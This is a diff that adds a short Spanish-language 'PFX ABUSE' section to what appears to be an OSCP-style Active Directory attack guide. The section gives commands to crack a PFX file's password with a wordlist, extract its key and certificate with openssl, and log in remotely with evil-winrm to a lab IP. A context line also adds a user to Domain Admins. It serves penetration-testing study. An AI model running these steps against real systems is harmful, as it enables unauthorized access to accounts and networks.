@@ -354,3 +354,34 @@ net group "Domain Admins" "Usuario_Actual" /add /domain
 - **Just-in-Time** administration
 
 Esta guía cubre el 95% de los vectores de ataque AD que verás en OSCP y entornos reales. ¡Domínalos y tendrás el AD bajo control!
+
+
+
+
+## PFX ABUSE
+
+
+si tenemos un archivo pfx, podemos explotarlo, primeramente, debemos de crackearlo si esta protegido por contraseña.
+
+```bash
+pkcs12cracker -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx -t 100
+```
+
+una vez tengamos la contraseña, tenemos que extraer los certs:
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+```
+
+y
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+```
+
+una vez ya los tengamos, podemos conectarnos con evil-winrm con los certs.
+
+```bash
+evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
+```
+
